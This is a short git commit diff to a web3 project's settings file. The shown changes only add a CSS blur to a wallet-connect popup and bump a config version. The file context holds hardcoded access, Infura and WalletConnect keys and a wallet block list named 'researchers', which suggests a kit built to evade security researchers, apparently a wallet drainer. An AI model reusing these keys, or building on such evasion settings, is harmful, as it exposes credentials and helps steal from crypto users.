67b648892cd8a31d1dbaf24e5558fad74777751a
wololoaoe123 <139802626+wololoaoe123@users.noreply.github.com>
2023-08-14 17:50:25 +0200

    Add files via upload

--- js/settings.js
+++ js/settings.js
@@ -5,7 +5,8 @@ let ACCESS_KEY = "6a6cb543-0574-4b47-9e3c-c833f42fb119";
 let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
 let themeVariables = {
     '--w3m-z-index': 10000,
-}; 
+    '--w3m-overlay-backdrop-filter': 'blur(6px)',
+};
 // Custom styles and colors https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
 
 
@@ -156,7 +157,7 @@ let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
 let wc_projectid = "0761e7d1b5103f901dbdb7fd033df5b9"; // ProjectID from https://cloud.walletconnect.com/
 
 //Do not touch
-let cfgversion = 660;
+let cfgversion = 680;
 
 // Block wallets
 let researchers = [
